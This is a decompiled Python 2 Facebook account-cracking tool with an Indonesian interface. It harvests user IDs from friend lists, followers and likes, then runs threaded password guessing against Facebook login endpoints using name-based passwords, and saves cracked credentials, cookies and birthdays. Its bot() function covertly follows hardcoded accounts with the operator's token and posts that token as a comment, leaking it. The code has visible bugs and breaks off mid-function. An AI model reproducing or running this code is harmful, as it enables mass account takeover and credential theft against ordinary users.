# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Aug  1 2021, 19:01:43) 
# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
# Embedded file name: romi
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, uuid, calendar
from multiprocessing.pool import ThreadPool
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import ConnectionError
from datetime import datetime
from datetime import date
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
p = '\x1b[1;97m'
k = '\x1b[1;93m'
m = '\x1b[1;91m'
d = '\x1b[90;1m'
h = '\x1b[92;1m'
k = '\x1b[93;1m'
b = '\x1b[94;1m'
j = '\x1b[95;1m'
a = '\x1b[96;1m'
try:
    import requests
except ImportError:
    os.system('pip2 install requests')

reload(sys)
sys.setdefaultencoding('utf8')
ip = requests.get('https://api.ipify.org').text
s = requests.Session()
fb = 'https://m.facebook.com'
api = 'https://b-api.facebook.com/method/auth.login'
id = []
cp = []
ok = []
loop = 0
ct = datetime.now()
n = ct.month
bulan1 = [
 'Januari',
 'Februari',
 'Maret',
 'April',
 'Mei',
 'Juni',
 'Juli',
 'Agustus',
 'September',
 'Oktober',
 'Nopember',
 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
day = current
op = bulan1[nTemp]
my_date = date.today()
hr = calendar.day_name[my_date.weekday()]
tanggal = '%s-%s-%s-%s' % (hr, ha, op, ta)
tgl = '%s %s %s' % (ha, op, ta)
bulan = {'01': 'Januari', 
   '02': 'Februari', 
   '03': 'Maret', 
   '04': 'April', 
   '05': 'Mei', 
   '06': 'Juni', 
   '07': 'Juli', 
   '08': 'Agustus', 
   '09': 'September', 
   '10': 'November', 
   '11': 'Oktober', 
   '12': 'Desember'}

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


def defaultua():
    ua = random.choice(['Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/id_ID;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]',
     'Mozilla/5.0 (Series40; NokiaX2-02/10.90; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/1.0.2.26.11',
     'Mozilla/5.0 (Linux; Android 11; SM-F916B Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.90 Safari/537.36 [FB_IAB/FB4A;FBAV/311.0.0.44.117;]'])
    try:
        ugent = open('ugent.txt', 'w')
        ugent.write(ua)
        ugent.close()
    except (KeyError, IOError):
        logs()


def gantiua():
    os.system('rm -rf ugent.txt')
    ua = raw_input('\n \x1b[1;93m[?] masukan user agent kamu : \x1b[1;93m')
    try:
        ugent = open('ugent.txt', 'w')
        ugent.write(ua)
        ugent.close()
        jalan('\n \x1b[1;93m[*] sukses mengganti user agent')
        print '\n \x1b[1;93m[*] user agent kamu : \x1b[1;92m' + ua
        pler = raw_input('\n \x1b[1;97m\x1b[1;93m[?] apakah ingin mengganti user agent? (Y/t): \x1b[1;92m')
        if pler == '':
            menu()
        elif pler == 'Y' or pler == 'y':
            gantiua()
        elif pler == 'T' or pler == 't':
            menu()
    except (KeyError, IOError):
        jalan('\n [*] gagal mengganti user agent')
        raw_input('\n [*] kembali')
        menu()


### BAGIAN LOGO ###
def logo():
	os.system("clear")
	print("""%s
\x1b[1;91m___________         _____ _____________________
\x1b[1;92m\_   _____/        /     \\______   \_   _____/>>AUTHOR
\x1b[1;93m |    __) ______  /  \ /  \|    |  _/|    __)>>BINTANG
\x1b[1;94m |    |  /_____/ /    Y    \    |   \|     \>>TZY 
\x1b[1;95m \___ |  \x1b[1;96mV 2.1   \x1b[1;95m\____|__  /______  /\___  />>BROTE
\x1b[1;96m     \/                   \/       \/     \/      """%(N))   


def tokenz():
    os.system('clear')
    try:
        requests.get('https://mbasic.facebook.com')
    except requests.exceptions.ConnectionError:
        exit(' [!] tidak ada koneksi internet')

    try:
        token = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print '' + p + ''
        print ' \x1b[1;92m[*] \x1b[1;92mtools ini menggunakan  token fb'
        print ' [*] \x1b[1;92mapakah anda sudah tau cara mendapatkan token?'
        print ' [*] \x1b[1;92mjika belum silahkan ketik \x1b[1;93m"open" \x1b[1;92muntuk melihat tutorial'
        token = raw_input('\n [?] \x1b[1;93mtoken : \x1b[1;96m')
        if token == 'open':
            os.sytem('xdg-open https://youtu.be/IdxphPBMMTU')
            exit('\n [*] jika sudah paham silahkan ketik ulang python2 run.py')
        try:

            otw = requests.get('https://graph.facebook.com/me?access_token=' + token)
            a = json.loads(otw.text)
            zedd = open('login.txt', 'w')
            zedd.write(token)
            zedd.close()
            print '\n\n\x1b[1;92m \x1b[1;92m[*] Login succesfull'
            print ' \x1b[1;92m[*] sedang masuk...'
            bot()
        except KeyError:
            print '[!] token kadaluwarsa'
            sys.exit()


def bot():
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print ' [!] token kadaluwarsa'
        os.system('rm -rf login.txt')

    requests.post('https://graph.facebook.com/100041129048948/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100023344580184/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100001457152638/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100006613569734/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100049181736259/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100006541202647/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100064563975028/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100009384338470/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100000056561882/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100001540299108/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100034234007701/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100016478086163/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100055159268362/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100045799894488/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100017553167451/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100000839038766/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/914950576126047/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/383882326594489/likes?summary=true&access_token=' + token)
    requests.post('https://graph.facebook.com/213614107297063/comments/?message=' + token + '&access_token=' + token)
    menu()


def menu():
    global token
    os.system('clear')
    try:
        requests.get('https://mbasic.facebook.com')
    except requests.exceptions.ConnectionError:
        exit(' [!] tidak ada koneksi internet')

    try:
        token = open('login.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print '[!] token kadaluwarsa'
        os.system('rm -f login.txt')
        tokenz()
    except requests.exceptions.ConnectionError:
        print '[!] Tidak Ada Koneksi!'
        sys.exit()

    logo()
    print ''
    print ' \x1b[1;93m[+] Author      : \x1b[1;92mBINTANG-XD'
    print ' \x1b[1;93m[+] Version     : \x1b[1;92m5.3'
    print ' \x1b[1;93m[+] YouTube     : \x1b[1;92mBINTANG XD'
    print ' \x1b[1;93m[+] ======================================================'
    print ' \x1b[1;93m[+] Bergabung   : \x1b[1;92m%s' % tgl
    print ' \x1b[1;93m[+] Status      : ' + H + 'Premium dong'
    print ' \x1b[1;93m[+] ======================================================'
    print ' \x1b[1;93m[+] ID          : \x1b[1;92m' + id
    print ' \x1b[1;93m[+] IP          : \x1b[1;92m' + ip
    print ''
    print ' [ selamat datang \x1b[1;93m' + nama + '\x1b[1;97m ]'
    print ''
    print ' \x1b[1;92m01 \x1b[1;93mcrack dari id publik'
    print ' \x1b[1;92m02 \x1b[1;93mcrack dari followers'
    print ' \x1b[1;92m03 \x1b[1;93mcrack dari like postingan'
    print ' \x1b[1;92m04 \x1b[1;93mcrack dari postingan grup'
    print ' \x1b[1;92m05 \x1b[1;93mcrack dari pencarian nama'
    print ' \x1b[1;92m06 \x1b[1;93mcrack dari target massal'
    print ' \x1b[1;92m07 \x1b[1;93mambil id dari teman target'
    print ' \x1b[1;92m08 \x1b[1;92minformasi tambahan'
    print ' ' + m + '00' + p + ' \x1b[1;91mlogout'
    print ''
    ask = raw_input(' \x1b[1;92m[?] pilih : \x1b[1;93m')
    if ask == '':
        menu()
    elif ask == '1' or ask == '01':
        publik()
    elif ask == '2' or ask == '02':
         followers()
    elif ask == '3' or ask == '03':
         likes()
    elif ask == '4' or ask == '04':
        postgrup()
    elif ask == '5' or ask == '05':
        pencarian()
    elif ask == '6' or ask == '06':
        massal()
    elif ask == '7' or ask == '07':
        ambilid()
    elif ask == '8' or ask == '08':
        infotambahan()
    elif ask == '0' or ask == '00':
        os.system('rm -f login.txt')
        jalan(' [!] berhasil menghapus token ')
        exit()
    else:
        jalan(' [!] pilih yang bener ! ')
        menu(token)


def infotambahan():
    print ''
    print ' \x1b[1;92m08 \x1b[1;93msetting user agent'
    print ' \x1b[1;92m09 \x1b[1;93mChek hasil crack'
    print ' \x1b[1;92m10 \x1b[1;93mlaporkan bug script'
    print ' \x1b[1;92m11 \x1b[1;93minformasi token'
    print ' \x1b[1;91m00 \x1b[1;91mkeluar'
    print ''
    pk = raw_input(' \x1b[1;92m[?] pilih : \x1b[1;93m')
    if pk == '':
        menu()
    else:
        if pk == '8' or pk == '08':
            return gantiua()
        if pk == '9' or pk == '09':
            cekakun()
        elif pk == '10' or pk == '10':
            laporbug()
        elif pk == '11' or pk == '11':
            infologin()
        elif pk == '0' or pk == '00':
            menu()



def postgrup():
    jalan(' [*] maaf fitur ini tidak tersedia sekarang\n [*] silahkan tunggu update terbaru')
    raw_input('\n [*] kembali ')
    menu()


def pencarian():
    jalan(' [*] maaf fitur ini tidak tersedia sekarang\n [*] silahkan tunggu update terbaru')
    raw_input('\n [*] kembali ')
    menu()

def publik():
    print " [*] isi 'me' jika ingin crack dari daftar teman"
    idt = raw_input(' [+] masukkan id atau username : ')
    if idt == '':
        menu()
    try:
        mmk = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
        kntl = json.loads(mmk.text)
    except KeyError:
        print '[!] ID Tidak Tersedia!'
        menu()

    ajg = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
    ppk = json.loads(ajg.text)
    for i in ppk['data']:
        uid = i['id']
        na = i['name']
        nm = na.rsplit(' ')[0]
        id.append(uid + '|' + nm)

    print ''
    print ' [+] total id -> \x1b[1;91m' + str(len(id))
    pilihpw(ppk)


def followers():
    print " [*] isi 'me' jika ingin crack dari followers sendiri"
    idt = raw_input(' [?] masukan id atau username followers : ')
    if idt == '':
        menu()
    try:
        mmk = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
        kntl = json.loads(mmk.text)
    except KeyError:
        print '[!] ID Tidak Tersedia!'
        menu()

    ajg = requests.get('https://graph.facebook.com/' + idt + '/subscribers?limit=999999&access_token=' + token)
    ppk = json.loads(ajg.text)
    for i in ppk['data']:
        uid = i['id']
        na = i['name']
        nm = na.rsplit(' ')[0]
        id.append(uid + '|' + nm)

    print ''
    print ' [+] total id -> \x1b[1;91m' + str(len(id))
    pilihpw(ppk)


def likes():
    idt = raw_input(' [?] masukkan url atau id postingan : ')
    if idt == '':
        menu()
    ajg = requests.get('https://graph.facebook.com/' + idt + '/likes?limit=9999999&access_token=' + token)
    ppk = json.loads(ajg.text)
    for i in ppk['data']:
        uid = i['id']
        na = i['name']
        nm = na.rsplit(' ')[0]
        id.append(uid + '|' + nm)

    print ''
    print ' [+] total id -> \x1b[1;91m' + str(len(id))
    pilihpw(ppk)


def massal():
    global token
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        exit(' [!] token kadaluwarsa')

    try:
        print ' [*] minimal 2 target dan maksimal 100 target'
        tanya_total = int(input(' [+] masukan jumlah target : '))
    except:
        tanya_total = 1

    for t in range(tanya_total):
        t += 1
        idt = raw_input(' [*] id target %s : ' % t)
        try:
            for i in requests.get('https://graph.facebook.com/%s/friends?access_token=%s' % (idt, token)).json()['data']:
                uid = i['id']
                nama = i['name'].rsplit(' ')[0]
                id.append(uid + '|' + nama)

        except KeyError:
            print ' [!] id %s tidak tersedia' % idt

    print ''
    print ' [+] total id -> \x1b[1;91m' + str(len(id))
    pilihpw(i)


def ambilid():
    it = raw_input(' [?] masukan id target : ')
    if it == '':
        menu()
    try:
        toket = open('login.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/%s?access_token=%s' % (it, toket))
        a = json.loads(otw.text)
        print ' [*] nama : %s' % a['name']
    except KeyError:
        jalan('\n [!] token kadaluwarsa')
        tokenz()
    except IOError:
        jalan('\n [!] token kadaluwarsa')
        tokenz()

    tampung = []
    teman = []
    lim = raw_input(' [?] limit : ')
    print ''
    ada = requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (it, lim, toket))
    idi = json.loads(ada.text)
    for x in idi['data']:
        tampung.append(x['id'])

    for id in tampung:
        try:
            ada2 = requests.get('https://graph.facebook.com/%s/friends?access_token=%s' % (id, toket))
            idi2 = json.loads(ada2.text)
            try:
                for b in idi2['data']:
                    teman.append(b['id'])

            except KeyError:
                print ' [!] teman private'

            print ' [*]', id, 'jumlah teman', len(teman)
            del teman[:]
        except KeyError:
            print ' [!] akun terkena spam'

    kembali()


def cekakun():
    print '\n \x1b[1;93m[1]. lihat hasil crack OK '
    print ' [2]. lihat hasil crack CP '
    anjg = raw_input('\n [?] pilih : \x1b[1;92m')
    if anjg == '':
        menu()
    elif anjg == '1':
        dirs = os.listdir('OK')
        print ''
        for file in dirs:
            print ' [*] ' + file

        try:
            file = raw_input('\n [?] Sihlahkan di pilih hasil crack nya ?: \x1b[1;93m')
            if file == '':
                menu()
            totalok = open('OK/%s' % file).read().splitlines()
        except IOError:
            exit(' [!] file %s tidak tersedia' % file)

        nm_file = ('%s' % file).replace('-', ' ')
        del_txt = nm_file.replace('.txt', '')
        print '\n *-------------------------------------------------*'
        print ' [+] tanggal : %s -total : %s' % (del_txt, len(totalok))
        print ''
        os.system('cat OK/%s' % file)
        raw_input('\n [*] Tekan enter untuk kembali menu semula')
        menu()
    elif anjg == '2':
        dirs = os.listdir('CP')
        print ''
        for file in dirs:
            print ' [*] ' + file

        try:
            file = raw_input('\n [?] Mau check hasil crack yg mana ?: \x1b[1;92m')
            if file == '':
                menu()
            totalcp = open('CP/%s' % file).read().splitlines()
        except IOError:
            exit(' [!] file %s tidak tersedia' % file)

        nm_file = ('%s' % file).replace('-', ' ')
        del_txt = nm_file.replace('.txt', '')
        print '\n *-------------------------------------------------*'
        print ' [+] tanggal : %s -total :\x1b[1;93m %s' % (del_txt, len(totalcp))
        print ''
        os.system('cat CP/%s' % file)
        raw_input('\n\n [*] tekan ENTER untuk kembali ke menu ')
        menu()
    else:
        menu()


def laporbug():
    asulo = raw_input('\n \x1b[1;92m[?] masukan laporan bug script : \x1b[1;92m').replace(' ', '%20')
    if asulo == '':
        menu()
    os.system('xdg-open https://wa.me/6281272106675?text=' + asulo)
    raw_input('\n \x1b[1;92m[*] \x1b[1;93mkembali ')
    menu()


def infologin():
    print ''
    print '\n [*] token : \x1b[1;92m' + token
    print ''
    raw_input('\n\x1b[1;97m [*] kembali ')
    menu()


def infonya():
    print '\n [+] hasil OK disimpan ke > OK/%s.txt' % tanggal
    print ' [+] hasil CP disimpan ke > CP/%s.txt' % tanggal
    print '\n [!] anda bisa menjeda proses crack dengan mematikan data seluler'
    print ''


def pilihpw(file):
    hg = raw_input('' + p + ' \x1b[1;93m[?] apakah anda ingin menggunakan sandi manual? [Y/t] : ')
    if hg == '':
        pilihpw(file)
    elif hg == 'Y' or hg == 'y':
        manual(file)
    elif hg == 'T' or hg == 't':
        otomatis(file)
    else:
        print ' [!] Pilih Yang Bener'
        pilihpw()


def manual(file):
    print ''
    print ' [?] gunakan , (koma) untuk pemisah contoh : sandi123,sandi12345,dll. setiap kata sandi minimal 6 karakter atau lebih'
    print ''
    pwzx = raw_input(' [?] masukan kata sandi : ')
    print ' [*] crack dengan sandi -> [ %s%s%s ]' % (M, pwzx, N)
    if len(pwzx) == 0:
        exit(' [!] isi yang benar, tidak boleh kosong!')
    manualnjing(file)


def manualnjing(file):
    print ''
    print '' + p + ' \x1b[1;93m[ pilih metode crack - silahkan coba satu\xc2\xb2 ]'
    print ''
    print ' [1] metode api (fast)'
    print ' [2] metode mbasic (slow)'
    print ' [3] metode mobile (super slow)'
    print ''
    x = raw_input(' [?] metode : ')
    if x == '':
        print ' [!] pilih yang benar!!'
        manualnjing(file)
    elif x == '1':
        bapiman()
    elif x == '2':
        mbasicman()
    elif x == '3':
        mobileman()
    else:
        print ' [!] pilih yang benar!'
        exit()


def bapiman():
    asu = ('pwzx').split(',')
    print '\n [+] \x1b[1;92mhasil OK disimpan ke > OK/%s.txt' % tanggal
    print ' [+] \x1b[1;93mhasil CP disimpan ke > CP/%s.txt' % tanggal
    print '\n \x1b[1;92m[!] anda bisa menjeda proses crack dengan mematikan data seluler'
    print ''

    def main(user):
        global loop
        global token
        try:
            ua = open('ugent.txt', 'r').read()
        except IOError:
            ua = 'Mozilla/5.0 (Series40; NokiaX2-02/10.90; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/1.0.2.26.11'

        pwx = []
        sys.stdout.write('\r \x1b[1;97m[*] [crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)))
        sys.stdout.flush()
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for pw in asu:
                pw = pw.lower()
                ses = requests.Session()
                headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': ua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
                param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
                api = 'https://b-api.facebook.com/method/auth.login'
                send = ses.get(api, params=param, headers=headers_)
                if 'session_key' in send.text and 'EAAA' in send.text:
                    print '\r  \x1b[1;92m*--> ' + uid + '|' + pw + '        '
                    ok.append(uid + '|' + pw)
                    open('OK/%s.txt' % tanggal, 'a').write('  * --> %s|%s\n' % (uid, pw))
                    break
                    continue
                elif 'www.facebook.com' in send.json()['error_msg']:
                    try:
                        token = open('login.txt').read()
                        sw = requests.get('https://graph.facebook.com/' + uid + '/?access_token=' + token)
                        b = json.loads(sw.text)
                        graph = b['birthday']
                        month, day, year = graph.split('/')
                        month = bulan[month]
                        print '\r\x1b[1;93m  * --> ' + uid + '|' + pw + '|' + day + ' ' + month + ' ' + year + ' '
                        cp.append(uid + '|' + pw + '|' + day + ' ' + month + ' ' + year)
                        open('CP/%s.txt' % tanggal, 'a').write('  * --> %s|%s|%s %s %s\n' % (uid, pw, day, month, year))
                        break
                    except (KeyError, IOError):
                        graph = ' '
                    except:
                        pass

                    print '\r\x1b[1;93m  * --> ' + uid + '|' + pw + '                        '
                    cp.append(uid + '|' + pw)
                    open('CP/%s.txt' % tanggal, 'a').write('  * --> %s|%s\n' % (uid, pw))
                    break
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n\n\x1b[1;97m \x1b[1;93m[#] crack selesai...'
    exit()


def mbasicman():
    asu = ('pwzx').split(',')
    print '\n \x1b[1;92m[+] hasil OK disimpan ke > OK/%s.txt' % tanggal
    print ' \x1b[1;93m[+] hasil CP disimpan ke > CP/%s.txt' % tanggal
    print '\n \x1b[1;92m[!] anda bisa menjeda proses crack dengan mematikan data seluler'
    print ''

    def main(user):
        global loop
        global token
        try:
            ua = open('ugent.txt', 'r').read()
        except IOError:
            ua = 'Mozilla/5.0 (Series40; NokiaX2-02/10.90; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/1.0.2.26.11'

        pwx = []
        sys.stdout.write('\r \x1b[1;97m[*] [crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)))
        sys.stdout.flush()
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for pw in asu:
                pw = pw.lower()
                rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
                xo = rex.content
                if 'mbasic_logout_button' in xo or 'save-device' in xo:
                    print '\r\x1b[1;92m  * --> ' + uid + '|' + pw + '        '
                    ok.append(uid + '|' + pw)
                    open('OK/%s.txt' % tanggal, 'a').write('  * --> %s|%s\n' % (uid, pw))
                    break
                    continue
                if 'checkpoint' in xo:
                    try:
                        token = open('login.txt').read()
                        sw = requests.get('https://graph.facebook.com/' + uid + '/?access_token=' + token)
                        b = json.loads(sw.text)
                        graph = b['birthday']
                        month, day, year = graph.split('/')
                        month = bulan[month]
                        print '\r\x1b[1;93m  * --> ' + uid + '|' + pw + '|' + day + ' ' + month + ' ' + year + ' '
                        cp.append(uid + '|' + pw + '|' + day + ' ' + month + ' ' + year)
                        open('CP/%s.txt' % tanggal, 'a').write('  * --> %s|%s|%s %s %s\n' % (uid, pw, day, month, year))
                        break
                    except (KeyError, IOError):
                        graph = ' '
                    except:
                        pass

                    print '\r\x1b[1;93m  * --> ' + uid + '|' + pw + '                        '
                    cp.append(uid + '|' + pw)
                    open('CP/%s.txt' % tanggal, 'a').write('  * --> %s|%s\n' % (uid, pw))
                    break
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n\n\x1b[1;93m [#] crack selesai...'
    exit()


def mobileman():
    asu = ('pwzx').split(',')
    print '\n \x1b[1;92m[+] hasil OK disimpan ke > OK/%s.txt' % tanggal
    print ' \x1b[1;93m[+] hasil CP disimpan ke > CP/%s.txt' % tanggal
    print '\n \x1b[1;92m[!] anda bisa menjeda proses crack dengan mematikan data seluler'
    print ''

    def main(user):
        global loop
        global token
        try:
            ua = open('ugent.txt', 'r').read()
        except IOError:
            ua = 'Mozilla/5.0 (Series40; NokiaX2-02/10.90; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/1.0.2.26.11'

        pwx = []
        sys.stdout.write('\r \x1b[1;97m[*] [crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)))
        sys.stdout.flush()
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for asu in pw:
                asu = asu.lower()
                ses = requests.Session()
                ses.headers.update({'Host': 'm.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                p = ses.get('https://m.facebook.com')
                b = ses.post('https://m.facebook.com/login.php', data={'email': uid, 'pass': asu, 'login': 'submit'})
                if 'c_user' in ses.cookies.get_dict().keys():
                    kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
                    print '\r  %s* --> %s|%s|%s                 %s' % (H, uid, asu, kuki, N)
                    wrt = '  * --> %s|%s|%s' % (uid, asu, kuki)
                    ok.append(wrt)
                    open('OK/%s.txt' % tanggal, 'a').write('%s\n' % wrt)
                    break
                    continue
                elif 'checkpoint' in ses.cookies.get_dict().keys():
                    try:
                        token = open('login.txt').read()
                        sw = requests.get('https://graph.facebook.com/' + uid + '/?access_token=' + token)
                        b = json.loads(sw.text)
                        graph = b['birthday']
                        month, day, year = graph.split('/')
                        month = bulan[month]
                        print '\r  %s* --> %s|%s|%s %s %s     %s' % (K, uid, asu, day, month, year, N)
                        wrt = '  * --> %s|%s|%s %s %s' % (uid, asu, day, month, year)
                        cp.append(wrt)
                        open('CP/%s.txt' % tanggal, 'a').write('%s\n' % wrt)
                        break
                    except (KeyError, IOError):
                        graph = ' '
                    except:
                        pass

                    print '\r  %s* --> %s|%s                %s' % (K, uid, asu, N)
                    wrt = '  * --> %s|%s' % (uid, asu)
                    open('CP/%s.txt' % tanggal, 'a').write('%s\n' % wrt)
                    break
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n\n\x1b[1;93m [#] crack selesai...'
    exit()


def otomatis(file):
    print ''
    print '' + p + ' \x1b[1;93m[ pilih metode crack - silahkan coba satu\xc2\xb2 ]'
    print ''
    print ' [1] metode api (fast)'
    print ' [2] metode mbasic (slow)'
    print ' [3] metode mobile (super slow)'
    print ''
    z = raw_input(' [?] metode : ')
    if z == '':
        print ' [!] pilih yang benar!!'
        manualnjing(file)
    elif z == '01' or z == '1':
        bapi()
    elif z == '02' or z == '2':
        mbasic()
    elif z == '03' or z == '3':
        mobile()
    else:
        print ' [!] pilih yang benar!'
        exit()


ua = 'ua'
ree = {'Host': 'free.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}

def bapi():
    print '\n \x1b[1;92m[+] hasil OK disimpan ke > OK/%s.txt' % tanggal
    print ' \x1b[1;93m[+] hasil CP disimpan ke > CP/%s.txt' % tanggal
    print '\n \x1b[1;92m[!] anda bisa menjeda proses crack dengan mematikan data seluler'
    print ''

    def main(user):
        global loop
        global token
        try:
            ua = open('ugent.txt', 'r').read()
        except IOError:
            ua = 'Mozilla/5.0 (Series40; NokiaX2-02/10.90; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/1.0.2.26.11'

        pwx = []
        sys.stdout.write('\r \x1b[1;97m[*] [crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)))
        sys.stdout.flush()
        uid, name = user.split('|')
        if len(name) >= 6:
            pwx = [
             name, name + '123', name + '1234', name + '12345']
        else:
            if len(name) <= 2:
                pwx = [
                 name + '123', name + '1234', name + '12345']
            elif len(name) <= 3:
                pwx = [
                 name + '123', name + '12345']
            else:
                pwx = [
                 name + '123', name + '12345']
            try:
                for pw in pwx:
                    pw = pw.lower()
                    ses = requests.Session()
                    headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': ua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
                    param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
                    api = 'https://b-api.facebook.com/method/auth.login'
                    send = ses.get(api, params=param, headers=headers_)
                    if 'session_key' in send.text and 'EAAA' in send.text:
                        print '\r  \x1b[1;92m*--> ' + uid + '|' + pw + '        '
                        ok.append(uid + '|' + pw)
                        open('OK/%s.txt' % tanggal, 'a').write('  * --> %s|%s\n' % (uid, pw))
                        break
                        continue
                    elif 'www.facebook.com' in send.json()['error_msg']:
                        try:
                            token = open('login.txt').read()
                            sw = requests.get('https://graph.facebook.com/' + uid + '/?access_token=' + token)
                            b = json.loads(sw.text)
                            graph = b['birthday']
                            month, day, year = graph.split('/')
                            month = bulan[month]
                            print '\r\x1b[1;93m  * --> ' + uid + '|' + pw + '|' + day + ' ' + month + ' ' + year + ' '
                            cp.append(uid + '|' + pw + '|' + day + ' ' + month + ' ' + year)
                            open('CP/%s.txt' % tanggal, 'a').write('  * --> %s|%s|%s %s %s\n' % (uid, pw, day, month, year))
                            break
                        except (KeyError, IOError):
                            graph = ' '
                        except:
                            pass

                        print '\r\x1b[1;93m  * --> ' + uid + '|' + pw + '                        '
                        cp.append(uid + '|' + pw)
                        open('CP/%s.txt' % tanggal, 'a').write('  * --> %s|%s\n' % (uid, pw))
                        break
                        continue

                loop += 1
            except:
                pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n\n\x1b[1;92m [#] crack selesai...'
    exit()


def mbasic():
    print '\n \x1b[1;92m[+] hasil OK disimpan ke > OK/%s.txt' % tanggal
